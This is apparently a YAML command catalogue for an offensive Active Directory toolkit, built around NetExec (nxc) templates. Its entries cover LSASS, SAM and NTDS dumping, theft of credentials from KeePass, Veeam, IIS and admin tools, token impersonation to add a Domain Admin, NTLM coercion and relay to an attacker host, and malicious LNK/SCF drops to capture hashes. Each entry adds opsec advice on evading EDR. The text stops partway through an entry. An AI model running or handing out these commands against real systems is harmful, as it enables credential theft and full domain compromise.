  # ══════════════════════════════════════════════════════════════════════════════
  # SMB — CREDENTIAL DUMPING MODULES
  # ══════════════════════════════════════════════════════════════════════════════

  - id: nxc_smb_lsass_modules
    name: NXC SMB — LSASS Dump Modules (lsassy / nanodump / handlekatz / procdump)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, lsass, lsassy, nanodump, handlekatz, procdump, dump]
    description: >
      All LSASS dump methods via NXC. lsassy parses in-memory (no disk drop),
      nanodump uses a minimal PE, handlekatz duplicates the LSASS handle without
      injecting, procdump uses SysInternals (often blocked). Try in order from
      stealthiest to loudest when one fails.
    commands:
      - label: "lsassy — in-memory parse (preferred)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M lsassy"
      - label: "nanodump — minimal PE, better EDR evasion"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M nanodump"
      - label: "handlekatz — handle duplication, no injection"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M handlekatz"
      - label: "procdump — SysInternals (likely detected)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M procdump"
      - label: "comsvcs — rundll32 MiniDump method"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M comsvcs"
      - label: "hash_spider — recursive LSASS across hosts"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M hash_spider"
      - label: "dpapi_hash — dump DPAPI masterkey hashes"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M dpapi_hash"
      - label: "Sweep with lsassy across subnet"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M lsassy --continue-on-success"
    opsec: >
      All LSASS access generates Sysmon Event 10. lsassy/nanodump are quieter
      than procdump. EDR with behavioral detection will catch most of these.
      Use handlekatz or nanodump first.
    cleanup: []

  - id: nxc_smb_sam_lsa_ntds
    name: NXC SMB — SAM / LSA / NTDS Dump (Built-in)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, sam, lsa, ntds, dump, secretsdump]
    description: >
      Built-in NXC credential dumping — no external modules needed. SAM dumps
      local hashes, LSA dumps cached creds and service account passwords, NTDS
      extracts all domain hashes from DC. Chain them together with --sam --lsa --dpapi.
    commands:
      - label: "Dump SAM (local account hashes)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --sam"
      - label: "Dump LSA secrets (cached creds, service accounts)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --lsa"
      - label: "Dump DPAPI secrets"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --dpapi"
      - label: "Chain all three together"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --sam --lsa --dpapi"
      - label: "Dump NTDS (all domain hashes — DC only)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --ntds"
      - label: "NTDS via VSS (stealthier than DRSUAPI)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --ntds vss"
      - label: "NTDS via ntdsutil module"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M ntdsutil"
      - label: "SAM sweep across subnet"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --sam --continue-on-success"
    opsec: >
      NTDS DRSUAPI: generates 4662 replication events — detected by MDI.
      VSS: quieter, generates VSS events. SAM/LSA: registry reads, events 7036/8222.
    cleanup: []

  - id: nxc_smb_eventlog_creds
    name: NXC SMB — eventlog_creds (Harvest Creds from Event Logs)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, eventlog, 4688, sysmon, credentials, harvest]
    description: >
      Parses Windows Event ID 4688 (process creation) and Sysmon Event ID 1 to
      extract credentials from command-line arguments. Admins often run commands
      like 'net user username password /add' which get logged in cleartext.
      Requires local admin. Often finds more creds than LSASS on sysadmin boxes.
    commands:
      - label: "Extract creds from event logs"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M eventlog_creds"
      - label: "Sweep subnet for event log creds"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M eventlog_creds --continue-on-success"
    opsec: >
      Read-only event log access — very low noise. Does not create processes.
    cleanup: []

  - id: nxc_smb_powershell_history
    name: NXC SMB — powershell_history (PSReadLine History)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, powershell, history, psreadline, credentials]
    description: >
      Reads PowerShell console history from PSReadLine (ConsoleHost_history.txt)
      for all users on the target. Admins often type credentials directly into
      PowerShell — these persist in plaintext in history files. Very high hit rate
      on admin workstations.
    commands:
      - label: "Dump PowerShell history all users"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M powershell_history"
      - label: "Sweep all admin hosts"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M powershell_history --continue-on-success"
    opsec: >
      File read only — no events generated. Very stealthy. Check workstations
      and servers where admins connect interactively.
    cleanup: []

  - id: nxc_smb_iis
    name: NXC SMB — iis (IIS Application Pool / Web.config Credentials)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, iis, web, applicationpool, credentials, connectionstrings]
    description: >
      Extracts credentials from IIS configuration — application pool service
      accounts, connection strings in web.config, and SMTP credentials. IIS servers
      frequently store database credentials and service account passwords in
      plaintext in config files.
    commands:
      - label: "Extract IIS credentials"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M iis"
      - label: "Sweep web servers"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M iis --continue-on-success"
    opsec: >
      File read — low noise. May trigger alerts if IIS config access is audited.
    cleanup: []

  - id: nxc_smb_gpp
    name: NXC SMB — gpp_password / gpp_autologin (SYSVOL Credentials)
    tab: Credential Attacks
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, gpp, sysvol, cpassword, autologin, cleartext]
    description: >
      GPP (Group Policy Preferences) cpassword in Groups.xml encrypted with a
      published AES key — trivially decrypted. gpp_autologin finds autologon
      credentials in Registry.xml. Both found in SYSVOL, readable by all domain
      users. Common hit in environments with older GPOs.
    commands:
      - label: "GPP cpassword from SYSVOL"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M gpp_password"
      - label: "GPP autologin credentials"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M gpp_autologin"
      - label: "Run both at once"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M gpp_password -M gpp_autologin"
      - label: "Manual decrypt if you find cpassword"
        cmd: "gpp-decrypt '<cpassword_value>'"
    opsec: >
      SYSVOL read — no events, extremely low noise. Blends with normal domain
      computer SYSVOL access.
    cleanup: []

  - id: nxc_smb_msol
    name: NXC SMB — msol (Azure AD Connect MSOL Account Password)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, msol, azuread, azure-ad-connect, dcsync, hybrid]
    description: >
      Extracts the MSOL_* service account password used by Azure AD Connect
      from the local SQL database on the AAD Connect server. The MSOL account
      typically has DCSync rights on the on-prem AD — instant domain compromise.
      Requires local admin on the AAD Connect server.
    commands:
      - label: "Extract MSOL account credentials"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M msol"
      - label: "DCSync with extracted MSOL account"
        cmd: "impacket-secretsdump '{DOMAIN}/MSOL_ACCOUNT:{PASSWORD}'@{DC_IP} -just-dc-ntlm"
    opsec: >
      Reads from local SQL DB on AAD Connect server. Low noise locally,
      but MSOL DCSync generates 4662 replication events on DC.
    cleanup: []

  - id: nxc_smb_veeam
    name: NXC SMB — veeam (Veeam Backup Credential Extraction)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, veeam, backup, credentials, database]
    description: >
      Extracts credentials from the local Veeam Backup & Replication SQL database.
      Veeam stores credentials for all backup targets — often domain admin accounts,
      ESXi hosts, NAS shares. Huge credential goldmine if Veeam is deployed.
    commands:
      - label: "Extract Veeam credentials"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M veeam"
      - label: "Find Veeam servers first"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'sc query VeeamBackupSvc' --continue-on-success | grep 'RUNNING'"
    opsec: >
      SQL DB read — no events if SQL auditing not enabled. Very stealthy.
    cleanup: []

  - id: nxc_smb_app_creds
    name: "NXC SMB — Application Credential Modules (winscp / putty / mremoteng / rdcman / mobaxterm / vnc)"
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, winscp, putty, mremoteng, rdcman, mobaxterm, vnc, app-creds]
    description: >
      Extract saved credentials from common admin tools. These modules search
      registry and config files for stored passwords. Sysadmin workstations are
      treasure troves — mRemoteNG and RDCMan often store dozens of server
      credentials in weakly encrypted files.
    commands:
      - label: "WinSCP — saved FTP/SFTP/SSH creds"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M winscp"
      - label: "PuTTY — saved SSH private keys and sessions"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M putty"
      - label: "mRemoteNG — RDP/SSH/VNC connection manager creds"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M mremoteng"
      - label: "RDCMan — Remote Desktop Connection Manager creds"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M rdcman"
      - label: "MobaXterm — SSH/RDP session creds"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M mobaxterm"
      - label: "VNC — stored access passwords from registry/config"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M vnc"
      - label: "Notepad++ — session data (may contain creds)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M 'notepad++'"
      - label: "Sweep all at once across subnet"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M winscp -M putty -M mremoteng -M rdcman --continue-on-success"
    opsec: >
      Registry reads and file reads — very low noise. No process creation events.
    cleanup: []

  - id: nxc_smb_keepass
    name: NXC SMB — keepass_discover / keepass_trigger
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, keepass, password-manager, cve-2023-24055]
    description: >
      Discover KeePass databases then inject a malicious trigger into the KeePass
      config to export all passwords in cleartext when the user opens KeePass.
      CVE-2023-24055 (unpatched KeePass 2.x). Massive credential dump if found
      on an admin workstation.
    commands:
      - label: "Step 1 — Find KeePass databases"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M keepass_discover"
      - label: "Step 2 — Inject trigger for export"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M keepass_trigger -o KEEPASS_CONFIG_PATH='C:\\Users\\{TARGET_USER}\\AppData\\Roaming\\KeePass\\KeePass.config.xml' EXPORT_PATH='C:\\Windows\\Temp\\kp_export.xml'"
      - label: "Step 3 — Wait for user to open KeePass, then retrieve"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --get-file 'C:\\Windows\\Temp\\kp_export.xml' /tmp/kp_export.xml"
    opsec: >
      Trigger injection writes to KeePass config. Export happens next time
      user opens KeePass — passive wait. Remove trigger after export.
    cleanup:
      - label: "Remove export file from target"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'del /f C:\\Windows\\Temp\\kp_export.xml'"

  - id: nxc_smb_wifi
    name: NXC SMB — wifi (Wireless Network Credential Extraction)
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, wifi, wireless, credentials, psk]
    description: >
      Extract saved wireless network credentials from Windows hosts using netsh.
      Useful on laptops — may reveal home WiFi, corporate WiFi pre-shared keys,
      or WiFi passwords reused elsewhere. All stored in DPAPI-protected profiles.
    commands:
      - label: "Dump wireless credentials"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M wifi"
      - label: "Sweep workstations/laptops"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M wifi --continue-on-success"
    opsec: >
      Runs netsh wlan via remote exec — generates WMI process creation events.
    cleanup: []

  # ══════════════════════════════════════════════════════════════════════════════
  # SMB — PRIVILEGE ESCALATION MODULES
  # ══════════════════════════════════════════════════════════════════════════════

  - id: nxc_smb_backup_operator
    name: NXC SMB — backup_operator (Backup Operators → NTDS Dump)
    tab: Privilege Escalation
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, backup-operator, privesc, ntds, registry-dump]
    description: >
      Automates the full Backup Operators to Domain Admin escalation. If your
      account is in the Backup Operators group, this module uses the SeBackupPrivilege
      to copy the SAM, SECURITY and SYSTEM hives, then automatically dumps
      the extracted hashes. No local admin needed — Backup Operators is enough.
    commands:
      - label: "Check if current user is in Backup Operators"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'whoami /groups | findstr Backup'"
      - label: "Run backup_operator privesc"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M backup_operator"
      - label: "Use machine hash from output for NTDS dump"
        cmd: "nxc smb {DC_IP} -u '{DC_NAME}$' -H '{MACHINE_HASH}' --ntds"
    opsec: >
      Registry hive export via SeBackupPrivilege — unusual but legitimate activity
      for Backup Operators. Generates VSS-related events.
    cleanup: []

  - id: nxc_smb_impersonate
    name: NXC SMB — impersonate (Token Impersonation of Logged-On Users)
    tab: Privilege Escalation
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, impersonate, token, privilege-escalation, lateral]
    description: >
      Impersonate the security context of logged-on users without knowing their
      password — using token duplication. Run commands as a DA who is currently
      logged into the machine. Requires local admin. Extremely powerful for
      lateral movement when a DA session is active.
    commands:
      - label: "List impersonatable users on target"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M impersonate"
      - label: "Impersonate user and run command"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M impersonate -o TOKEN=1 EXEC='whoami'"
      - label: "Add DA group member via impersonated token"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M impersonate -o TOKEN=1 EXEC='powershell.exe \"Invoke-Command -ComputerName {DC_IP} -ScriptBlock {Add-ADGroupMember -Identity Domain Admins -Members {USERNAME}}\"'"
      - label: "Hunt for DA sessions first"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --loggedon-users | grep -i admin"
    opsec: >
      Token duplication is detectable by EDR. Process creation under impersonated
      context generates 4688 events. Quick impersonation with minimal footprint.
    cleanup: []

  - id: nxc_smb_change_password
    name: NXC SMB — change-password (Force Password Reset)
    tab: Privilege Escalation
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN, TARGET_USER]
    tags: [nxc, smb, change-password, acl, force-reset, genericall]
    description: >
      Force a password change on a target account — requires ForceChangePassword
      or GenericAll ACL rights over the target user (found via BloodHound).
      Use shadow credentials instead when possible (less noisy), but this is
      the quick option when ACL rights are available.
    commands:
      - label: "Change target user password"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M change-password -o USER='{TARGET_USER}' NEWPASS='NewP@ssword123!'"
      - label: "Verify new password works"
        cmd: "nxc smb {DC_IP} -u '{TARGET_USER}' -p 'NewP@ssword123!' -d {DOMAIN}"
    opsec: >
      Password change logged (4723). Victim will notice their password no longer
      works. Prefer shadow credentials for stealth — this is loud.
    cleanup:
      - label: "Restore original password (if known)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M change-password -o USER='{TARGET_USER}' NEWPASS='<ORIGINAL_PASSWORD>'"

  # ══════════════════════════════════════════════════════════════════════════════
  # SMB — RECON / COERCION / VULN CHECK MODULES
  # ══════════════════════════════════════════════════════════════════════════════

  - id: nxc_smb_vuln_checks
    name: "NXC SMB — Vulnerability Checks (zerologon / petitpotam / nopac / ms17-010 / printnightmare)"
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN, SUBNET]
    tags: [nxc, smb, vuln, zerologon, petitpotam, nopac, ms17-010, printnightmare, spooler]
    description: >
      Non-exploiting vulnerability checks across the network. Confirms
      presence of known vulns without triggering them. Run these first to
      build your target priority list.
    commands:
      - label: "ZeroLogon check (CVE-2020-1472)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M zerologon"
      - label: "PetitPotam check"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M petitpotam"
      - label: "NoPac check (CVE-2021-42287/42278)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M nopac"
      - label: "EternalBlue / MS17-010 (no creds needed)"
        cmd: "nxc smb {SUBNET}/24 -u '' -p '' -M ms17-010"
      - label: "PrintNightmare check"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M printnightmare"
      - label: "Print Spooler running check"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M spooler"
      - label: "WebDAV service running check (needed for relay via HTTP)"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M webdav"
      - label: "DFSCoerce check"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M dfscoerce"
      - label: "ShadowCoerce check"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M shadowcoerce"
    opsec: >
      Passive checks only — no exploitation. ZeroLogon sends a few Netlogon
      packets. PetitPotam/DFSCoerce checks send RPC probes. Low noise overall.
    cleanup: []

  - id: nxc_smb_coerce_plus
    name: NXC SMB — coerce_plus (All Coercion Methods)
    tab: Lateral Movement
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN, ATTACKER_IP]
    tags: [nxc, smb, coerce, petitpotam, dfscoerce, printerbug, shadowcoerce, mseven, relay]
    description: >
      Tries all coercion methods (PetitPotam, DFSCoerce, MSEven, ShadowCoerce,
      PrinterBug) against target to trigger NTLM auth to your machine. Start
      ntlmrelayx or certipy relay first, then run coerce_plus. Best combined
      with ADCS ESC8/ESC11 relay or LDAP relay for RBCD.
    commands:
      - label: "Start relay first (terminal 1) — ADCS ESC8"
        cmd: "certipy relay -target 'https://{CA_IP}' -template DomainController"
      - label: "Start relay first (terminal 1) — LDAP RBCD"
        cmd: "impacket-ntlmrelayx -t ldaps://{DC_IP} --delegate-access --no-dump"
      - label: "Run coerce_plus (terminal 2)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M coerce_plus -o LISTENER={ATTACKER_IP}"
      - label: "DFSCoerce only"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M dfscoerce -o LISTENER={ATTACKER_IP}"
      - label: "ShadowCoerce only"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M shadowcoerce -o LISTENER={ATTACKER_IP}"
    opsec: >
      Coercion generates RPC call events on target. Each method leaves different
      artifacts. Network monitoring will see outbound SMB auth attempt.
    cleanup: []

  - id: nxc_smb_av_recon
    name: "NXC SMB — AV/EDR/Security Recon (enum_av / wcc / runasppl / screenshot)"
    tab: Enumeration
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, enum-av, wcc, edr, av, runasppl, screenshot, defense]
    description: >
      Enumerate security products and protection settings before deploying
      offensive tools. Helps choose correct evasion technique. screenshot module
      captures current desktop state without login — useful for situational
      awareness.
    commands:
      - label: "Enumerate installed AV/EDR products"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M enum_av"
      - label: "Windows Configuration Checker (Credential Guard, PPL, etc.)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M wcc"
      - label: "Check if LSASS PPL (RunAsPPL) is enabled"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M runasppl"
      - label: "Take screenshot of current desktop"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M screenshot"
      - label: "Sweep subnet for AV and PPL"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M enum_av -M wcc --continue-on-success"
    opsec: >
      WMI queries for installed software (enum_av) are moderate noise.
      Screenshot creates brief RDP-like connection. wcc reads registry values.
    cleanup: []

  - id: nxc_smb_slinky_capture
    name: "NXC SMB — slinky / scuffy (LNK/SCF Hash Capture)"
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN, ATTACKER_IP]
    tags: [nxc, smb, slinky, scuffy, lnk, scf, ntlm-capture, responder]
    description: >
      Drop malicious LNK (slinky) or SCF (scuffy) files in writable shares.
      When a user browses the share, Windows auto-authenticates to the attacker
      UNC path — Responder captures the NTLMv2 hash. Fire and forget — works
      passively while the user browses.
    commands:
      - label: "Start Responder first (terminal 1)"
        cmd: "responder -I eth0 -dwv"
      - label: "Drop LNK in all writable shares (slinky)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M slinky -o NAME=Important_Report SERVER={ATTACKER_IP}"
      - label: "Drop SCF in specific share (scuffy)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M scuffy -o NAME=Important_Report SERVER={ATTACKER_IP} SHARE=Finance"
      - label: "Crack captured NTLMv2 hashes"
        cmd: "hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
    opsec: >
      Files persist in shares until removed. File creation logged (5145).
      Clean up immediately after capturing hashes.
    cleanup:
      - label: "Remove LNK file"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M slinky -o NAME=Important_Report SERVER={ATTACKER_IP} CLEANUP=True"

  - id: nxc_smb_misc
    name: "NXC SMB — Misc Modules (add-computer / rdp / generate-hosts)"
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, add-computer, rdp, maq, hosts-file]
    description: >
      Useful utility modules — add computer accounts (for RBCD/NoPac prereq),
      enable/disable RDP, generate hosts files and Kerberos config from domain data.
    commands:
      - label: "Add computer account (MAQ prerequisite)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M add-computer -o NAME='EVILPC$' PASSWORD='EvilPass123!'"
      - label: "Enable RDP on target"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M rdp -o ACTION=enable"
      - label: "Disable RDP (cleanup)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M rdp -o ACTION=disable"
      - label: "Generate /etc/hosts file from domain"
        cmd: "nxc smb {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --generate-hosts-file /tmp/ad_hosts.txt"
      - label: "Generate krb5.conf from domain"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --generate-krb5-file /tmp/krb5.conf"
      - label: "Tasklist — running processes"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --tasklist"
      - label: "QWinSta — active RDP sessions"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --qwinsta"
    cleanup:
      - label: "Delete added computer account"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M add-computer -o NAME='EVILPC$' DELETE=True"

  - id: nxc_smb_spider_plus
    name: NXC SMB — spider_plus (Share Content Indexing)
    tab: Enumeration
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, smb, spider-plus, shares, files, secrets, index]
    description: >
      Spider all readable shares and index every file path without downloading.
      Creates a JSON output you can grep for passwords, configs, keys, scripts.
      Then selectively download interesting files. READ_ONLY=false downloads
      everything — use carefully on large shares.
    commands:
      - label: "Index all shares (read-only, no download)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M spider_plus"
      - label: "Spider with download (READ_ONLY=false)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M spider_plus -o READ_ONLY=false"
      - label: "Spider specific share only"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M spider_plus -o SHARE=Finance"
      - label: "Exclude common noise folders"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M spider_plus -o EXCLUDE_EXTS=exe,dll,msi,png,jpg,gif"
      - label: "Search output for credential keywords"
        cmd: "grep -ri 'pass\\|cred\\|secret\\|key\\|token\\|pwd' ~/.nxc/logs/*spider*.json"
      - label: "Download specific interesting file"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --get-file '\\\\{TARGET}\\share\\path\\file.txt' /tmp/file.txt"
    opsec: >
      Heavy SMB read activity — generates many 5140/5145 events per file.
      Run off-hours or use targeted share access.
    cleanup: []

  # ══════════════════════════════════════════════════════════════════════════════
  # LDAP MODULES
  # ══════════════════════════════════════════════════════════════════════════════

  - id: nxc_ldap_enum_modules
    name: "NXC LDAP — Enumeration Modules (get-desc-users / obsolete / subnets / pso / whoami / find-delegation)"
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, ldap, enum, get-desc-users, obsolete, subnets, pso, whoami, delegation]
    description: >
      LDAP enumeration modules covering user descriptions (password goldmine),
      obsolete OS versions, network subnets, Fine-Grained Password Policy objects,
      and delegation misconfigurations. Run all of these right after getting creds.
    commands:
      - label: "User descriptions (check for passwords in desc field)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M get-desc-users"
      - label: "Find obsolete OS versions (XP, 2003, 2008, Vista, Win7)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M obsolete"
      - label: "AD subnet enumeration"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M subnets"
      - label: "Fine-Grained Password Policy (PSO) objects"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M pso"
      - label: "Whoami — current user's AD properties"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M whoami"
      - label: "Find all delegation configurations"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --find-delegation"
      - label: "Accounts trusted for delegation (unconstrained)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --trusted-for-delegation"
      - label: "Accounts with password not required flag"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --password-not-required"
      - label: "AdminCount=1 users (protected by SDProp)"
